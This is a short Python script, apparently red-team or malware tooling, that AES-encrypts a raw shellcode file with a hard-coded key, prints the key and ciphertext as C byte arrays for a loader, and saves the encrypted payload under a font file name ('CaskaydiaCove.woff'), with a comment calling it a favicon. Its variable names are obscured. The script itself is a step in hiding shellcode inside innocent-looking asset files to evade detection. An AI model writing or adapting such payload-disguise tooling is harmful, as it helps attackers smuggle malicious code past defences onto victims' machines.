#!/usr/bin/env python3

import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom

import hashlib


# AES key
#KEY = urandom(16)

# Use a static key for testing
MSWOW = b'MrzfUckWEF21wefx'

def encrypt_AES(plaintext, mswow):
    k = hashlib.sha256(mswow).digest()
    iv = b'\x00' * 16
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(plaintext)


def main():
    xzj = open('shellcode.raw', "rb").read()

    # encrypt payload and print the random AES key
    ct = encrypt_AES(xzj, MSWOW)
    print('char MSWOW[] = { 0x' + ', 0x'.join(hex(ord(chr(x)))[2:] for x in MSWOW) + ' };')
    print('char Xzj[] = { 0x' + ', 0x'.join(hex(ord(chr(x)))[2:] for x in ct) + ' };')
    # testing a working payload
    # ct = open('calc-thread64.bin', 'rb').read()

    # save payload to favicon.ico
    with open('CaskaydiaCove.woff', 'wb') as f:
        f.write(ct)

if __name__ == '__main__':
    main()
